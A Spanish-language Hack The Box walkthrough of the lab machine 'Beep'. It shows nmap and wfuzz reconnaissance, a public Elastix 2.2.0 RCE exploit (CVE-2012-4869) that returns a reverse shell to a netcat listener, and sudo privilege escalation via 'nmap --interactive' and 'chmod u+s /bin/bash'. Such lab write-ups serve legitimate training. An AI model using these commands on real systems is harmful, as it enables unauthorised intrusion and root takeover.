---
layout: single
title: Beep - Hack The Box
excerpt: "Esta máquina es fácil, hay bastantes maneras de poder vulnerarla, lo que haremos será usar un Exploit que nos conecte de manera remota a la máquina, será configurado y modificado para que sea aceptado pues la página web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit."
date: 2023-02-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-beep/beep_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Elastix 
  - Remote Command Execution (RCE) 
  - RCE - CVE-2012-4869
  - SUDO Exploitation
  - OSCP Style
---
![](/assets/images/htb-writeup-beep/beep_logo.png)

Esta máquina es fácil, hay bastantes maneras de poder vulnerarla, lo que haremos será usar un Exploit que nos conecte de manera remota a la máquina, sera configurado y modificado para que sea aceptado pues la página web que esta activa en el puerto 80 tiene ya expirado su certificado SSL. Una vez dentro usaremos los permisos que tenemos para convertirnos en Root usando la herramienta nmap tal y como lo menciona el Exploit.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Investigacion">Investigación de Servicios</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando y Probando un Exploit</a></li>
				<ul>
                                        <li><a href="#PruebaExp">Probando el Exploit: Elastix 2.2.0 - Remote Code Execution</a></li>
                                </ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está conectada y vamos a analizar el TTL para saber que SO tiene dicha máquina.
```
ping -c 4 10.10.10.7 
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=137 ms
64 bytes from 10.10.10.7: icmp_seq=2 ttl=63 time=138 ms
64 bytes from 10.10.10.7: icmp_seq=3 ttl=63 time=136 ms
64 bytes from 10.10.10.7: icmp_seq=4 ttl=63 time=140 ms

--- 10.10.10.7 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3025ms
rtt min/avg/max/mdev = 135.993/137.635/139.741/1.376 ms
```
Estamos contra una máquina con Linux, interesante. Ahora vamos a realizar los escaneos.

<h2 id="Puertos">Escaneo de Puertos</h2>

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts            
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:51 CST
Initiating SYN Stealth Scan at 20:51
Scanning 10.10.10.7 [65535 ports]
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 5038/tcp on 10.10.10.7
Discovered open port 878/tcp on 10.10.10.7
Completed SYN Stealth Scan at 20:52, 37.91s elapsed (65535 total ports)
Nmap scan report for 10.10.10.7
Host is up, received user-set (0.45s latency).
Scanned at 2023-02-15 20:51:30 CST for 38s
Not shown: 45619 filtered tcp ports (no-response), 19904 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
111/tcp  open  rpcbind syn-ack ttl 63
143/tcp  open  imap    syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 63
878/tcp  open  unknown syn-ack ttl 63
993/tcp  open  imaps   syn-ack ttl 63
995/tcp  open  pop3s   syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63
5038/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 38.05 seconds
           Raw packets sent: 177474 (7.809MB) | Rcvd: 20100 (804.176KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Ufff muchos puertos abiertos, tenemos bastantillo que investigar, aunque ya vi unos servicios conocidos como el **SSH**, el **RPCBIND** y el puerto HTTP, veamos que show con los demás servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```
nmap -sC -sV -p22,25,80,110,111,143,443,878,993,995,3306,5038 10.10.10.7 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-15 20:55 CST
Stats: 0:03:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.00% done; ETC: 20:59 (0:00:04 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.14s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp   open  http     Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp  open  pop3     Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: APOP IMPLEMENTATION(Cyrus POP3 server v2) STLS USER AUTH-RESP-CODE PIPELINING UIDL RESP-CODES TOP LOGIN-DELAY(0) EXPIRE(NEVER)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp  open  imap     Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK THREAD=ORDEREDSUBJECT URLAUTHA0001 NAMESPACE X-NETSCAPE LIST-SUBSCRIBED ID MAILBOX-REFERRALS LISTEXT IMAP4rev1 CONDSTORE IDLE CATENATE UNSELECT UIDPLUS ANNOTATEMORE THREAD=REFERENCES SORT ATOMIC RENAME SORT=MODSEQ STARTTLS LITERAL+ CHILDREN IMAP4 QUOTA NO RIGHTS=kxte BINARY ACL MULTIAPPEND
443/tcp  open  ssl/http Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2023-03-30T02:56:54+00:00; +2s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
878/tcp  open  status   1 (RPC #100024)
993/tcp  open  ssl/imap Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp  open  pop3     Cyrus pop3d
3306/tcp open  mysql    MySQL (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 1.1
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 245.95 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Ok, para empezar, no tenemos ninguna credencial para el servicio SSH por lo que es el primero que descartamos, podríamos iniciar viendo que es ese servicio de **Postfix smtpd** y después la página web del puerto HTTP. De ahí en adelante también podríamos investigar el servicio **Cyrus pop3d**. Bueno empecemos a investigar pues.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Investigacion">Investigación de Servicios</h2>

Vamos a iniciar con el **Postfix smtpd**:

**Postfix es un agente de transporte de mensajes (MTA) de última generación, también conocido como servidor SMTP, que tiene dos propósitos: Es responsable de transportar mensajes de correo electrónico desde un cliente de correo o  agente de usuario de correo (MUA) a un servidor SMTP remoto.**

No tenemos una versión y de hecho busque con **Searchsploit** para saber si había algo, pero no, no mostro ningún resultado:
```
searchsploit Postfix smtpd                                                                                                              
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```
Entonces vamos a descartar este servicio de momento y pasemos a analizar la página web.

**IMPORTANTE**, tuve problemas para entrar pues salia el error **SSL_ERROR_UNSUPPORTED_VERSION**, el sig. link explica como resolverlo, echale un ojo: 

* https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express

Muy bien, ya estamos dentro:

![](/assets/images/htb-writeup-beep/Captura1.png)

Aparece el nombre **Elastix**, investiguemos que es eso:

**Elastix es un software de servidor de comunicaciones unificadas que reúne PBX IP, correo electrónico, mensajería instantánea, fax y funciones colaborativas. Cuenta con una interfaz Web e incluye capacidades como un software de centro de llamadas con marcación predictiva**

Mmmmm entonces podemos entrar directamente a la máquina para poder encontrar las flags una vez que lo vulneremos, o bueno eso pienso. Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-beep/Captura2.png">
</p>

Usan PHP, entonces podemos hacer un **Fuzzing** para ver que otras subpáginas hay, pero antes de hacerlo, probemos si sirven las credenciales por defecto que tiene el servicio **Elastix**, las credenciales son:
* eLaStIx.
* 2oo7

No sirvieron, bueno hagamos el **Fuzzing**.

<h2 id="Fuzz">Fuzzing</h2>

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.7/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
=====================================================================

000000001:   302        9 L      26 W       278 Ch      "# directory-list-2.3-medium.txt"                                           
000000007:   302        9 L      26 W       278 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
000000015:   302        9 L      26 W       288 Ch      "index"                                                                     
000000031:   302        9 L      26 W       287 Ch      "logo"                                                                      
000000063:   302        9 L      26 W       290 Ch      "archive"                                                                   
000000085:   302        9 L      26 W       287 Ch      "info"                                                                      
000000084:   302        9 L      26 W       292 Ch      "resources"                                                                 
000000083:   302        9 L      26 W       288 Ch      "icons"                                                                     
000000082:   302        9 L      26 W       291 Ch      "services"                                                                  
000000081:   302        9 L      26 W       292 Ch      "templates"                                                                 
000000080:   302        9 L      26 W       288 Ch      "media"
...
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Wow, wow, wow, salieron demasiados códigos de estado 302, este código quiere decir que el recurso solicitado ha sido movido temporalmente a la URL dada por las cabeceras **Location (en-US)**, ósea que no podremos accesar a ellos.

Entonces no creo que podamos hacer mucho, busquemos directamente un Exploit para este servicio.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando y Probando un Exploit</h2>

```
searchsploit elastix      
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                      | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                    | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                              | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                           | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                          | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                         | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                     | php/webapps/18650.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Hay varios que me gustaría probar como el LFI, XSS y PHP Code Injection, pero creo que sería mejor si probamos con el RCE. Vamos a analizar y después los demás.

<h2 id="PruebaExp">Probando el Exploit: Elastix 2.2.0 - Remote Code Execution</h2>

```
searchsploit -x php/webapps/18650.py     
  Exploit: FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/18650
     Path: /usr/share/exploitdb/exploits/php/webapps/18650.py
    Codes: OSVDB-80544, CVE-2012-4869
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (418)
```
Parece que este Exploit nos mete directamente usando la URL para inyectar un Payload que será una Reverse Shell, esto ya es automatizado, solamente tendríamos que poner la IP de la máquina, nuestra IP y el puerto al que nos conectara, osease una netcat. Vamos a probarlo:
```
rhost="10.10.10.7"
lhost="Tu_IP"
lport=443
```
Cambia esos datos y corre el script con Python 2 y...nada, no me conecto a nada y no salió nada en la página. Supongo que es por el problema que tuve antes para poder entrar a la página, pues el certificado SSL parece ya no servir, quizá si lo modificamos puede que apruebe el Exploit y sirva, vamos a investigar un poco como podemos modificarlo.

Durante la búsqueda, encontré un GitHub que justamente cambia el Exploit para que este opere bien:
* https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution

Para modificar el Exploit se debe buscar una extensión que sirva con el servicio **FreePBX** que está relacionado con el servicio **Elastix** de esta máquina, pero ¿qué es FreePBX?

**FreePBX es una GUI de código abierto basado en Web que controla y dirige Asterisk. También se incluye como una pieza clave de otras distribuciones como Elastix, Trixbox y AsteriskNOW.**

Entonces como el certificado SSL ya no sirve, por consiguiente, la extensión del Exploit tampoco (que es la extensión 1000), entonces usaremos otra extensión disponible para poder conectarnos al servidor y que con esto sirva el Exploit.

Para buscar una extensión es necesario el paquete de herramientas **sipvicious**, de aqui usaremos la herramienta **svwar**, esta herramienta identifica las líneas de extensión en funcionamiento en un PBX. También le dice si la línea de extensión requiere autenticación o no.

Claro que en este caso ya no es necesario, pues ya hay una extensión que sirve dentro del Exploit modificado en el GitHub, lo único que tenemos que hacer es copiar los cambios, ósea, la extension, las 3 líneas de código abajo de la extensión y agregar el **context** al **urlopen**.

Ahora sí, levantamos la netcat otra vez:
```
nc -nvlp 443
listening on [any] 443 ...
```
* Corremos el Exploit:
```
python2 Exploit_Elastix1.py
```
* Y ya estamos dentro:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.7] 49122
whoami
asterisk
id
uid=100(asterisk) gid=101(asterisk)
```

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Bueno, ¿y ahora qué? El mismo Exploit nos indica que hacer y es activar el nmap con SUDO de forma interactiva, para poder usar nmap desde la consola y no como comando, solamente escribimos **!sh** y podremos escalar privilegios para ser Root:
```
sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
```
Ya solo es buscar las flags que la del Root se encuentra en **/root** y la del usuario en **/home**. PEROOOO, que tal si vemos de que otra forma podemos explotar la máquina? Es hora de experimentar.

Lo que hicimos fue abusar de los privilegios que tiene el usuario **Asterisk** que como ya vimos está ligado al servicio **Elastix** y **FreePBX**, pero que es este usuario?

**Asterisk es un programa de software libre que proporciona funcionalidades de una central telefónica.** Osea que por defecto, tiene ciertos privilegios para poder operar.

Con el comando **sudo -l** podemos ver que permisos como Root tiene dicho usuario **Asterisk**:
```
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```
Vaya, vaya, tenemos varios permisos como Root. Existe una página muy útil que nos ayudara en este caso para ver de qué otra forma podemos escalar privilegios para convertirnos en **Root**. 
Esta página es GTFOBins: 

* https://gtfobins.github.io/

Entonces veamos de que formas podemos escalar para ser **Root**, ojito que incluso ahí se ve el nmap que fue el que uso el Exploit para convertirnos en Root, así que ¡¡PROBEMOS OTROS!!

* Probando CHMOD:
```
ls -l /bin/bash
-rwxr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
sudo chmod u+s /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 729292 Jan 22  2009 /bin/bash
bash -p
id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
whoami
root
```
Por lo que leí en **GTFOBins**, se puede escalar usando chown, yum y service. ¡Intentalo!


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://stackoverflow.com/questions/63111167/ssl-error-unsupported-version-when-attempting-to-debug-with-iis-express
* https://www.exploit-db.com/exploits/18650
* https://www.offsec.com/vulndev/freepbx-exploit-phone-home/
* https://www.kali.org/tools/sipvicious/
* https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution
* https://gtfobins.github.io/


<br>
# FIN
